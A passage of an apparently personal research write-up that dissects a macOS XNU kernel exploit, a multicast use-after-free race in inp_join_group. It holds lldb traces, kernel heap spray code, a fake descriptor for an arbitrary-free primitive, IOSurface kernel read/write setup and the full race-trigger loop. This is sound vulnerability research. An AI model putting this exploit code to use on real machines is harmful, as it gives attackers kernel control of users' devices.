            frame #7: 0xfffffe00287b62b8 kernel.release.vmapple`ipc_kmsg_copyin_ool_ports_descriptor(dsc=0xfffffe150e8b5b84, user_dsc=0xfffffe150e8b5b94, is_64bit=<unavailable>, map=0xfffffe002c8e77d0, space=0xfffffe150db98380, dest=0xfffffe1510ffae40, kmsg=<unavailable>, optionp=0xfffffe6019b63d34, mr=<unavailable>) at ipc_kmsg.c:3443:9 [opt] [inlined]
            frame #8: 0xfffffe00287b6274 kernel.release.vmapple`ipc_kmsg_copyin_body(kmsg=<unavailable>, space=<unavailable>, map=0xfffffe002c8e77d0, optionp=0xfffffe6019b63d34) at ipc_kmsg.c:3831:16 [opt]
            frame #9: 0xfffffe00287b5ea0 kernel.release.vmapple`ipc_kmsg_copyin_from_user(kmsg=<unavailable>, space=<unavailable>, map=<unavailable>, priority=<unavailable>, optionp=<unavailable>, filter_nonfatal=<unavailable>) at ipc_kmsg.c:3971:8 [opt]
            frame #10: 0xfffffe00287cc29c kernel.release.vmapple`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:362:8 [opt]
            frame #11: 0xfffffe00288f9b2c kernel.release.vmapple`mach_syscall(state=0xfffffe1510f6ddd0) at bsd_arm64.c:276:11 [opt]
            frame #12: 0xfffffe0028902e78 kernel.release.vmapple`handle_svc(state=0xfffffe1510f6ddd0) at sleh.c:2411:3 [opt] [inlined]
            frame #13: 0xfffffe0028902e0c kernel.release.vmapple`sleh_synchronous(context=0xfffffe1510f6ddd0, esr=<unavailable>, far=5368741888) at sleh.c:743:3 [opt]
            frame #14: 0xfffffe002879479c kernel.release.vmapple`fleh_synchronous + 40
            frame #15: 0x00000001a5721954
            frame #16: 0x000000010004a168 // called _mach_msg_send from _spray_default_kalloc_ool_ports_with_data_kalloc_size (exp)
            frame #17: 0x00000001000489e8 // called _spray_default_kalloc_ool_ports from _exploitation_init
            frame #18: 0x0000000100048dbc // called _exploitation_init from _exploit_get_krw_and_kernel_base
            frame #19: 0x0000000100048ebc // called _exploit_get_krw_and_kernel_base from _main
            frame #20: 0x00000001001b50f4 
```

So, how can we determine allocated address?

The `kheap_default_ports` array contains `msgh_remote_port`, which specify to whom, among the messages we sprayed, the message will be sent.
Let's start by finding kernel's `ipc_port` structure address by referencing port at 0th index (the first sprayed port) among those ports.

```c
uint64_t proc_task(uint64_t proc) {
    uint64_t task = tfp0_kread64(proc + off_p_task);
    return task;
}

uint64_t task_self_addr(void) {
    uint64_t proc = proc_of_pid(getpid());
    uint64_t task = proc_task(proc);
    return task;
}

...

uint64_t find_port(mach_port_name_t port) {
    uint64_t task_addr = task_self_addr();
    
    uint64_t itk_space = kextrw_kreadptr(task_addr + off_task_itk_space);
    
    uint64_t is_table = kextrw_kreadptr(itk_space + off_ipc_space_is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = kextrw_kreadptr(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}
```

Upon inspection, we find the following:

`find_port(kheap_default_ports[0]) = 0xfffffe15117b000`

Starting from `ipc_port_t` address `0xfffffe15117b000` and following `ip_kmq_base` field, we can obtain `ipc_kmsg` structure address.
From there, following `ikm_header` field allows us to obtain `mach_msg_header_t` structure address.

```c
(lldb) p/x *(ipc_port*)0xfffffe15117b0000
(ipc_port) {
  ip_object = (io_bits = 0x80000000, io_references = 0x00000002)
   = {
     = {
      ip_waitq_type = 0x00000001
      ip_waitq_fifo = 0x00000001
      ...
    }
    ip_waitq = {
       = {
        waitq_type = 0x00000001
        waitq_fifo = 0x00000001
        ...
      }
      waitq_interlock = {
         ={...}
        lck_value = 0x04040144
      }
      ...
    }
  }
  ip_messages = {
    imq_messages = {
      ikmq_base = **0xfffffe1511711d00**
    }
    imq_seqno = 0x00000000
    imq_receiver_name = 0x00002803
    imq_msgcount = 0x0001
    imq_qlimit = 0x0005
    ...
  }
   = {
    ip_receiver = (actual=0xfffffe1510fcc080) 0x169e7e1510fcc080
    ip_destination = (actual=0xfffffe1510fcc080) 0x169e7e1510fcc080
    ip_timestamp = 0x10fcc080
  }
  ...
  ip_context = 0x0000000000000000
  ip_impcount = 0x00000000
  ip_mscount = 0x00000002
  ip_srights = 0x00000002
  ip_sorights = 0x00000000
   = {
    ip_kolabel = NULL
    ip_splabel = (actual=0x0) 0x0000000000000000
  }
}
```

```c
(lldb) p/x *(ipc_kmsg*)0xfffffe1511711d00
(ipc_kmsg) {
  ikm_next = 0xfffffe1511711d00
  ikm_prev = 0xfffffe1511711d00
   = {
    ikm_prealloc = NULL
    ikm_data = (actual=0x0) 0x0000000000000000
  }
  ikm_header = (actual=0xfffffe1511711d60) 0xb6a0fe1511711d60
  ikm_voucher_port = NULL
  ikm_importance = NULL
  ikm_inheritance = {
    next = NULL
    prev = NULL
  }
  ikm_turnstile = NULL
  ikm_size = 0x000000a0
  ikm_ppriority = 0x00000000
  ikm_signature = 0x6f9359dc00000000
  ikm_flags = 0x0000
  ikm_qos_override = 0x00
  ikm_voucher_type = 0x00000000
  ikm_inline_data = {}
}
```

```c
(lldb) p/x *(mach_msg_header_t*)0xfffffe1511711d60
(mach_msg_header_t) {
  msgh_bits = 0x80000011
  msgh_size = 0x00000058
  msgh_remote_port = 0xfffffe15117b0000
  msgh_local_port = NULL
  msgh_voucher_port = 0x00000000
  msgh_id = 0x00000000
}
```

When reading `mach_msg_header_t` structure address with `+ 0x24` offset, certain kernel address is observed.
**This is the kernel address allocated with KHEAP_DEFAULT type by spray,
i.e., address of OOL port descriptor array.**

```c
(lldb) x/gx 0xfffffe1511711d60+0x24
0xfffffe1511711d84: 0xfffffe2286e88000
```

In exploit code, `spray_default_kalloc_ool_ports_with_data_kalloc_size` function sets `msg->desc.count` to `0x4000/8`,
so the heap size allocated when creating the **OOL port descriptor array** is 0x4000.

Additionally, another kernel address can be seen within that array.

```c
(lldb) x/800gx 0xfffffe2286e88000 --force
0xfffffe2286e88000: 0xfffffe15107d38e0 0x0000000000000000
...
```

This kernel address corresponds to OOL port address—the `ipc_port` port address specified in exploit code within `spray_default_kalloc_ool_ports_with_data_kalloc_size` function’s `msg->desc.address` field.
(So, it is same as kernel port address of `contained_port[0]`.)

```c
(lldb) p/x *(ipc_port_t)0xfffffe15107d38e0
(ipc_port) {
  ip_object = (io_bits = 0x80000000, io_references = 0x00000002)
   = {
     = {
      ip_waitq_type = 0x00000001
      ip_waitq_fifo = 0x00000001
      ...
    ip_waitq = {
       = {
        waitq_type = 0x00000001
        waitq_fifo = 0x00000001
        ...
      }
      waitq_interlock = {
         ={...}
        lck_value = 0x02020144
      }
      ...
    }
  }
  ip_messages = {
    imq_messages = {
      ikmq_base = NULL
    }
    imq_seqno = 0x00000000
    imq_receiver_name = 0x00001607
    imq_msgcount = 0x0000
    imq_qlimit = 0x0005
    imq_context = 0x00000000
    ...
  }
   = {
    ip_receiver = (actual=0xfffffe1510fcc080) 0x448c7e1510fcc080
    ip_destination = (actual=0xfffffe1510fcc080) 0x448c7e1510fcc080
    ip_timestamp = 0x10fcc080
  }
  ...
  ip_context = 0x0000000000000000
  ip_impcount = 0x00000000
  ip_mscount = 0x00000001
  ip_srights = 0x00000002
  ip_sorights = 0x00000000
   = {
    ip_kolabel = NULL
    ip_splabel = (actual=0x0) 0x0000000000000000
  }
}
```

### Determining address of sprayed kmsg (KHEAP_DATA_BUFFERS)

Similarly, when `spray_data_kalloc_kmsg_single` function is executed once,
we can see—after tracing through several functions—that it attempts to allocate kernel heap memory in `ipc_kmsg_alloc`.

```c
(lldb) bt
        * thread #2, name = 'CPU1', stop reason = breakpoint 10.1
          * frame #0: 0xfffffe00248f88e0 kernel.release.vmapple`kalloc_ext(kheap=0xfffffe00267ab818, req_size=16332, flags=Z_WAITOK, site=0xfffffe0026e80078) at kalloc.c:1687 [opt]
            frame #1: 0xfffffe00248c3a18 kernel.release.vmapple`ipc_kmsg_alloc(size=16264, user_descs=<unavailable>, flags=<unavailable>) at ipc_kmsg.c:1288:10 [opt]
            frame #2: 0xfffffe00248c41ec kernel.release.vmapple`ipc_kmsg_get_from_user(msg_addr=<unavailable>, size=16264, kmsgp=0xfffffe6029d5bd38) at ipc_kmsg.c:1973:9 [opt]
            frame #3: 0xfffffe00248dc26c kernel.release.vmapple`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:349:8 [opt]
            frame #4: 0xfffffe0024a09b2c kernel.release.vmapple`mach_syscall(state=0xfffffe15105689f0) at bsd_arm64.c:276:11 [opt]
            frame #5: 0xfffffe0024a12e78 kernel.release.vmapple`handle_svc(state=0xfffffe15105689f0) at sleh.c:2411:3 [opt] [inlined]
            frame #6: 0xfffffe0024a12e0c kernel.release.vmapple`sleh_synchronous(context=0xfffffe15105689f0, esr=<unavailable>, far=4445650944) at sleh.c:743:3 [opt]
            frame #7: 0xfffffe00248a479c kernel.release.vmapple`fleh_synchronous + 40
            frame #8: 0x00000001c2755954
            frame #9: 0x000000010264df58    // called _mach_msg_send from _spray_data_kalloc_kmsg_single
            frame #10: 0x000000010264ca2c   // called _spray_data_kalloc_kmsg_single from _exploitation_init
            frame #11: 0x000000010264cde8   // called _exploitation_init from _exploit_get_krw_and_kernel_base
            frame #12: 0x000000010264cee8   // called _exploit_get_krw_and_kernel_base from _main
            frame #13: 0x00000001029cd0f4
```

By examining the first sprayed port, `kheap_data_ports[0]`,
we can obtain kernel `ipc_port` structure address as follows:

`find_port(kheap_data_ports[0]) = 0xfffffe150ff41ea0`

Checking `ikm_header`, we see that `msgh_size` field is `0x3f88`,
which tells us that kernel allocation of that size has occurred.

The user‑supplied data used during the spray `kheap_data_spray_buf` can be found through `ikm_data` field inside `ipc_kmsg` structure.
The address stored in this field is **the kernel address of kmsg allocated as KHEAP_DATA_BUFFERS type as result of spray**.

```c
// https://github.com/apple-oss-distributions/xnu/blob/xnu-8019.41.5/osfmk/ipc/ipc_kmsg.c#L1978
...
	kmsg = ipc_kmsg_alloc(size, descriptors, IPC_KMSG_ALLOC_USER);
	if (kmsg == IKM_NULL) {
		return MACH_SEND_NO_BUFFER;
	}

	kmsg->ikm_header->msgh_size             = size;
...
```

```c
(lldb) p/x *(ipc_port*)0xfffffe150ff41ea0
(ipc_port) {
  ip_object = (io_bits = 0x80000000, io_references = 0x00000002)
   = {
     = {
      ip_waitq_type = 0x00000001
      ip_waitq_fifo = 0x00000001
      ip_waitq_irq = 0x00000000
      ...
    }
    ip_waitq = {
       = {
        waitq_type = 0x00000001
        waitq_fifo = 0x00000001
        waitq_irq = 0x00000000
        ...
      }
      waitq_interlock = {
         ={...}
        lck_value = 0x04040144
      }
      ...
    }
  }
  ip_messages = {
    imq_messages = {
      ikmq_base = 0xfffffe1510fdb100
    }
    imq_seqno = 0x00000000
    imq_receiver_name = 0x00001603
    imq_msgcount = 0x0001
    imq_qlimit = 0x0005
    ...
  }
   = {
    ip_receiver = (actual=0xfffffe1510dceb00) 0x7c88fe1510dceb00
    ip_destination = (actual=0xfffffe1510dceb00) 0x7c88fe1510dceb00
    ip_timestamp = 0x10dceb00
  }
  ...
  ip_mscount = 0x00000002
  ip_srights = 0x00000002
  ...
}
```

```c
(lldb) p/x *(ipc_kmsg*)0xfffffe1510fdb100
(ipc_kmsg) {
  ikm_next = 0xfffffe1510fdb100
  ikm_prev = 0xfffffe1510fdb100
   = {
    ikm_prealloc = (actual=0xfffffe228790c000) 0x3cf67e228790c000
    ikm_data = (actual=0xfffffe228790c000) 0x3cf67e228790c000
  }
  ikm_header = (actual=0xfffffe228790c000) 0x6efffe228790c000
  ikm_voucher_port = nullptr
  ikm_importance = nullptr
  ikm_inheritance = {
    next = nullptr
    prev = nullptr
  }
  ikm_turnstile = nullptr
  ikm_size = 0x00003fcc
  ikm_ppriority = 0x00000000
  ikm_signature = 0x1921770700000000
  ikm_flags = 0x0000
  ikm_qos_override = 0x00
  ikm_voucher_type = 0x00000000
  ikm_inline_data = {}
}
```

```c
(lldb) p/x *(mach_msg_header_t*)0xfffffe228790c000
(mach_msg_header_t) {
  msgh_bits = 0x00000011
  msgh_size = 0x00003f88
  msgh_remote_port = 0xfffffe150ff41ea0
  msgh_local_port = nullptr
  msgh_voucher_port = 0x00000000
  msgh_id = 0x00000000
}
```

When checking kernel address of the `ikm_data` field, **0xfffffe228790c000**,
we can see that it is composed of following data.

At **<+0x0020, +0x0024, +0x002c>**, the fake descriptor used for arbitrary free during construction of `kheap_data_spray_buf` is reflected as‑is.

And in **<0x0000~0x0020>**, the `mach_msg_header_t`, that is, `ikm_header` data, is located.
 

```
 // fake descriptor for free primitive
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
```

```c
(lldb) x/2033gx 0xfffffe228790c000 --force
0xfffffe228790c000<+0x0000>: 0x00003f8800000011 0xfffffe150ff41ea0
0xfffffe228790c010<+0x0010>: 0x0000000000000000 0x0000000000000000
0xfffffe228790c020<+0x0020>: 0x8188800000000001 0x02110000fffffe22
0xfffffe228790c030<+0x0030>: 0x00000000000007f8 0x0000000000000000
0xfffffe228790c040<+0x0040>: 0x0000000000000000 0x0000000000000000
...
0xfffffe228790ff60<+0x3f60>: 0x0000000000000000 0x8cffffdb00000000
0xfffffe228790ff70<+0x3f70>: 0x00000000fffffe22 0x0000000000000000
0xfffffe228790ff80<+0x3f80>: 0x0000000000000000

(lldb) p/x *(mach_msg_header_t*)0xfffffe228790c000
(mach_msg_header_t) {
  msgh_bits = 0x00000011
  msgh_size = 0x00003f88
  msgh_remote_port = 0xfffffe150ff41ea0
  msgh_local_port = nullptr
  msgh_voucher_port = 0x00000000
  msgh_id = 0x00000000
}
```

## 1-5. Going back, let's look at spray code again

So far, we’ve examined `contained_ports` corresponding to ool ports that get sprayed, as well as contents of `kheap_data_ports`, `ipc_kmsg`, and `ikmu_data` that make up the message.

After this, the `mach_port_request_notification` function is used to request that notification be sent for specific port.

For example, it is used to receive kernel‑generated (notify) messages such as “tell me when the port has no more senders” or “tell me when the port is destroyed.”

In case of the code below, it can interpret it as requesting kernel to send notification message to `notif_port` when there are no more send rights (`MACH_NOTIFY_NO_SENDERS`).

```csharp
...
    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
...
```

Next, the following code is executed because kernel read/write will later be performed via IOSurface.

```c
    // pre-init kernel rw
    IOSurfaceClient_array_buf = malloc(0x4000);
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);
    
    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);
    
    return 0;
}

//...
void kernel_rw_preinit(uint64_t kaddr, uint8_t *buf, size_t n)
{
    memset(buf, 0x07, n);

    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr + 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
    *(uint64_t *)(buf + 0x10 + 0xC0 + 0x18) = kaddr + 0x20 - 0xA0; // Write destination (+0xA0 added)
    
    _mapped_address = kaddr;
}

```

## 2. `get_arb_free_holder` - Triggering 1-byte copy via race

## 2-1. Before vs After

Before diving into function itself, I compared heap data at profiled `KHEAP_DEFAULT_MAPPABLE_LOC` and `KHEAP_DATA_MAPPABLE_LOC` addresses before and after executing `get_arb_free_holder`.

For ipc ports corresponding to `KHEAP_DEFAULT_MAPPABLE_LOC`:
Checking `ipc_port_t* port`, `ipc_kmsg* ikmq_base`, `mach_msg_header_t* ikm_data`, and the OOL port’s (`contained_port`) `ipc_port_t* port`, all the structure field values remained unchanged.

For ipc ports corresponding to `KHEAP_DATA_MAPPABLE_LOC`:

Looking at `ipc_port_t* port`, `ip_waitq.waitq_interlock.lck_value` field was changed (0x04040144 → 0x05050144).

![Screenshot 2025-11-11 at 8.17.15 PM.png](pics/2b160acd-d901-4396-bdc0-07d1fdade875.png)

Examining `mach_msg_header_t* ikm_data`,
the first byte of `msgh_bits` field was modified (0x00000011 → 0x88000011).

![Screenshot 2025-11-11 at 8.24.39 PM.png](pics/Screenshot_2025-11-11_at_8.24.39_PM.png)

Next, looking at contents of `ikm_data`,
specifically heap data at `KHEAP_DATA_MAPPABLE_LOC` at offset `+0x3f88`:

The byte value stored at offset `+0x3f8c` was changed (0x00000000 → 0x00000008).

In exploit code, there is piece of racing code that checks whether `port_peek_trailer_size(kheap_data_ports[i])` is 8 or not,
so this change may be related to that.

![Screenshot 2025-11-11 at 8.40.56 PM.png](pics/Screenshot_2025-11-11_at_8.40.56_PM.png)

## 2-2. `port_peek_trailer_size`

`port_peek_trailer_size` function internally calls `mach_port_peek` with following configuration.

```c
int port_peek_trailer_size(mach_port_t p)
{
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer;
    mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
    
    mach_port_peek(mach_task_self(),
                                  p,
                                  MACH_RCV_TRAILER_NULL,
                                  &msg_seqno,
                                  &msg_size,
                                  &msg_id,
                                  (mach_msg_trailer_info_t)&msg_trailer,
                                  &msg_trailer_size);

    return msg_trailer.msgh_trailer_size;
}
```

### `mach_port_peek`

Looking at `mach_port_peek` function in XNU code,
we can see that memory is copied from `max_trailer` to `trailer_infop`. `max_trailer` is obtained from `ipc_mqueue_peek_locked` function.

```c
kern_return_t
mach_port_peek(
	ipc_space_t                     space,
	mach_port_name_t                name,
	mach_msg_trailer_type_t         trailer_type,
	mach_port_seqno_t               *seqnop,
	mach_msg_size_t                 *msg_sizep,
	mach_msg_id_t                   *msg_idp,
	mach_msg_trailer_info_t         trailer_infop,
	mach_msg_type_number_t          *trailer_sizep)
{
//...

	/* Port locked and active */
	found = ipc_mqueue_peek_locked(&port->ip_messages, seqnop,
	    msg_sizep, msg_idp, &max_trailer, NULL);
	ip_mq_unlock(port);
	
	//...

	max_trailer.msgh_seqno = *seqnop;
	memcpy(trailer_infop, &max_trailer, *trailer_sizep);

	return KERN_SUCCESS;
}
```

In `ipc_mqueue_peek_locked` function, you can see code that copies memory to `msg_trailerp`.
The source for this copy starts from the end of existing `ikm_header`, calculated by adding `msgh_size`.

**So, memory from `+0x3f88` in `KHEAP_DATA_MAPPABLE_LOC` is copied to `msg_trailerp` with size of 0x44,
and this data can be retrieved in userland using `mach_port_peek` function.**

```c
unsigned
ipc_mqueue_peek_locked(ipc_mqueue_t mq,
    mach_port_seqno_t * seqnop,
    mach_msg_size_t * msg_sizep,
    mach_msg_id_t * msg_idp,
    mach_msg_max_trailer_t * msg_trailerp,
    ipc_kmsg_t *kmsgp)
{
//...
	if (msg_trailerp != NULL) {
		memcpy(msg_trailerp,
		    (mach_msg_max_trailer_t *)((vm_offset_t)kmsg->ikm_header +
		    mach_round_msg(kmsg->ikm_header->msgh_size)),
		    sizeof(mach_msg_max_trailer_t));
	}
	//...
	return res;
}
```

```c
(lldb) p/x *(mach_msg_mac_trailer_t*)(0xfffffe228d000000+0x3f88)
(mach_msg_mac_trailer_t) {
  msgh_trailer_type = 0x00000000
  msgh_trailer_size = 0x00000000
  msgh_seqno = 0x00000000
  msgh_sender = {
    val = ([0] = 0x000001f5, [1] = 0x00000014)
  }
  msgh_audit = {
    val = ([0] = 0x000001f5, [1] = 0x000001f5, [2] = 0x00000014, [3] = 0x000001f5, [4] = 0x00000014, [5] = 0x00000170, [6] = 0x00000162, [7] = 0x0000033b)
  }
  msgh_context = 0x0000000000000000
  msgh_ad = 0x00000000
  msgh_labels = (sender = 0x00000000)
}

(lldb) p/x sizeof(mach_msg_max_trailer_t)
(unsigned long) 0x0000000000000044
```

## 2-3. `mcast_increase_race_reliability()`

Up to this point, we compared kernel heap data before and after calling `get_arb_free_holder` function by triggering race.

Now, returning to main topic, we will look at racing code that triggers vulnerability.
To perform race reliably, we can see that `mcast_increase_race_reliability` is called 3 times.

```c
mach_port_t get_arb_free_holder(void)
{
    int success = 0;
    
    // reliability voodoo
    for (int i = 0; i < 3; ++i)
    {
        mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }
    ...
```

A UDPv6 socket is opened, 
and then `setsockopt` is called 3000 times with `MCAST_JOIN_GROUP` option while dynamically generating different multicast group addresses to join those multicast groups.

```c
void mcast_increase_race_reliability(void)
{
    struct group_req mreq = { 0 };
    struct sockaddr_in6 sin6 = {0};
    int s = socket(AF_INET6, SOCK_DGRAM, 0);
    
    mreq.gr_interface = 1;

    sin6.sin6_len = sizeof(sin6);
    sin6.sin6_family = AF_INET6;
    sin6.sin6_port = 7878;
    sin6.sin6_addr.__u6_addr.__u6_addr32[3] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[2] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[1] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[0] = (htonl(0xFF000000));

    memcpy(&mreq.gr_group, &sin6, sizeof(sin6));

    for (int i = 0; i < 3000; ++i)
    {
        ((struct sockaddr_in6 *)(&mreq.gr_group))->sin6_addr.__u6_addr.__u6_addr32[1] = i + (3000 * 3000);
        setsockopt(s, IPPROTO_IPV6, MCAST_JOIN_GROUP, &mreq, sizeof(mreq));
    }
}
```

## 2-4. 2-4. Going back, let's examine `get_arb_free_holder`

In macOS/iOS, the newly created thread is assigned “user‑initiated” QoS level so that **the system gives that thread higher execution priority.**

```c
mach_port_t get_arb_free_holder(void)
{
    ...
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
...
```

Here, value of `BYTECOPY_FIRST_TARGET` is **0xfffffe228d003f64**.

According to comment, 
this value is used to corrupt the trailer size of kmsg so it can be identified later, and it is also used as data for NECP syscall during subsequent spray.

```c
#define BYTECOPY_FIRST_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0x3F8C - BYTECOPY_OFFSET_IPV6) // will copy over trailer size of kmsg (used for identification of which kmsg was corrupted)
...
// initialize refill buffer, putting the target for the bytecopy primitive there
    uint8_t *necp_buf = malloc(4096);
    *(uint64_t *)(necp_buf + 0x278) = BYTECOPY_FIRST_TARGET
```

The `inp_join_group` function can be used as race condition to trigger use‑after‑free vulnerability and perform wild copy. The sequence is as follows:

1. Expand buffer that will trigger UaF to **default.kalloc.1664** size, and maximize it before next `realloc` occurs.
2. Trigger UaF in default.kalloc.1664, and if refill succeeds, perform byte‑copy primitive.
3. During race, refill UaF buffer in default.kalloc.1664.
4. Synchronize, and then
5. Check whether refill succeeded. If it did, the object with corrupted kmsg will return corrupted trailer size. This kmsg also has corrupted message bits. (0x80000000 – MACH_MSGH_BITS_COMPLEX)

```c
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664
//...
int mcast_race_sock;

int mcast_join_group(int ip)
{
    struct group_req mreq = { 0 };
    struct sockaddr_in6 sin6 = {0};
    
    mreq.gr_interface = 1;

    sin6.sin6_len = sizeof(sin6);
    sin6.sin6_family = AF_INET6;
    sin6.sin6_port = 7878;
    sin6.sin6_addr.__u6_addr.__u6_addr32[3] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[2] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[1] = ip;
    sin6.sin6_addr.__u6_addr.__u6_addr32[0] = (htonl(0xFF000000));

    memcpy(&mreq.gr_group, &sin6, sizeof(sin6));
    
    mreq.gr_interface = 1;
    
    return setsockopt(mcast_race_sock, IPPROTO_IPV6, MCAST_JOIN_GROUP, &mreq, sizeof(mreq));
}

//...
int necp_open(int flags)
{
    return syscall(SYS_necp_open, flags);
}

int necp_client_action(int necp_fd, uint32_t action, uint8_t *client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
{
    return syscall(SYS_necp_client_action, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

int spray_default_kalloc_necp(int necp_fd, uint8_t *b, uint32_t sz)
{
#define NECP_CLIENT_ADD 1
    uint8_t if_id[0x10];
    return necp_client_action(necp_fd, NECP_CLIENT_ADD, if_id, sizeof(if_id), b, sz);
}

//...
printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;
    for (int iterations = 0; iterations < 255; ++iterations)
    {
        pthread_t pt1;
        pthread_t pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = necp_open(0);
        
        mcast_race_sock = s;
        
        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
        // put it at its max size before next realloc will occur
        int ip = 0;
        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
        {
            mcast_join_group(ip);
        }
        
        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)ip);
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(ip + 1));
        
        // refill the UaF buffer in default.kalloc.1664 during the race
        for (int i = 0; i < 10; ++i)
        {
            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }
        
        // synchronize
        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);
        
        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
        {
            for (int i = 0; i < PORTS_COUNT; ++i)
            {
                int sz = port_peek_trailer_size(kheap_data_ports[i]);
                if (sz != 8)
                {
                    printf("kheap_data_idx: %08X\n", i);
                    kheap_data_idx = i;
                    break;
                }
            }
            if (kheap_data_idx != -1)
            {
                success = 1;
                break;
            }
        }

        close(s);
        printf("iteration %d\n", iterations);
    }
```

## 2-5. Taking closer look at where 1‑byte copy actually occurs

According to the information from the Zer0Con presentation, 
wild‑copy is triggered by UAF vulnerability in `inp_join_group`.

Based on Monterey 12.0.1 vmapple, we can examine this in detail using images below:

![Screenshot 2025-11-20 at 3.02.28 AM.png](pics/Screenshot_2025-11-20_at_3.02.28_AM.png)

![Screenshot 2025-11-20 at 3.15.05 AM.png](pics/Screenshot_2025-11-20_at_3.15.05_AM.png)

**According to presentation slide, the wild‑copy happens inside `imf_commit`,
but for some reason, placing breakpoints on both sites fails to hit them at all.**

**So where — and how — is 1‑byte copy actually happening?**

```c
// xnu-8019.41.5/bsd/netinet/in_mcast.c:890-892
static void
imf_commit(struct in_mfilter *imf)
{
	struct ip_msource       *ims;
	struct in_msource       *lims;

	RB_FOREACH(ims, ip_msource_tree, &imf->imf_sources) {
		lims = (struct in_msource *)ims;
		//__text:FFFFFE0007608404 29 75 40 39  LDRB W9, [X9,#0x1D]
		//__text:FFFFFE0007608408 09 71 00 39  STRB W9, [X8,#0x1C]
		//__text:FFFFFE000760840C 0A 05 40 F9  LDR  X10, [X8,#8]
		lims->imsl_st[0] = lims->imsl_st[1];
	}
	
	//__text:FFFFFE0007608474 C8 46 40 39  LDRB W8, [X22,#0x11]
	//__text:FFFFFE0007608478 C8 42 00 39  STRB W8, [X22,#0x10]
	imf->imf_st[0] = imf->imf_st[1];
}
```

To verify this more concretely,
I paused execution right before calling `get_arb_free_holder` (by stopping at point just before pressing Enter),

```c
    printf("before calling get_arb_free_holder\n");
    getchar();
    
    // trigger bug, get arbitrary free
    mach_port_t arb_free_holder = get_arb_free_holder();
    ...
```

**As we saw earlier in “2‑1. Before vs After,”
2 locations change: `KHEAP_DATA_MAPPABLE_LOC + 0x0` and `KHEAP_DATA_MAPPABLE_LOC + 0x3f88`.**

Let’s set watchpoints on those addresses and examine what happens.

```c
w s e -s 8 -- 0xfffffe228d000000
w s e -s 8 -- 0xfffffe228d003f88
```

Hmm, it's not completely certain, but
it seemed that 1‑byte copy was occurring somewhere around `in6p_join_group` function.

```c
(lldb) w s e -s 8 -- 0xfffffe228d000000
Watchpoint created: Watchpoint 1: addr = 0xfffffe228d000000 size = 8 state = enabled type = m
    watchpoint spec = '0xfffffe228d000000'
    watchpoint resources:
       #0: addr = 0xfffffe228d000000 size = 8
Watchpoint 1 hit:
    
new value: 69853348102161
(lldb) c
Process 1 resuming

Watchpoint 1 hit:
old value: 69853348102161
new value: 69855629803537
Process 1 stopped
* thread #1, name = 'CPU0', stop reason = watchpoint 1
    frame #0: 0xfffffe0017f03100 kernel.release.vmapple`ExceptionVectorsBase + 256
kernel.release.vmapple`ExceptionVectorsBase:
->  0xfffffe0017f03100 <+256>: b      0xfffffe0017f04148 ; el1_sp0_fiq_vector_long
    0xfffffe0017f03104 <+260>: nop    
    0xfffffe0017f03108 <+264>: nop    
    0xfffffe0017f0310c <+268>: nop    
Target 0: (kernel.release.vmapple) stopped.
(lldb) bt
* thread #1, name = 'CPU0', stop reason = watchpoint 1
  * frame #0: 0xfffffe0017f03100 kernel.release.vmapple`ExceptionVectorsBase + 256
    frame #1: 0xfffffe00183d44f0 kernel.release.vmapple`in6p_join_group(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:2310:7 [opt] [inlined]
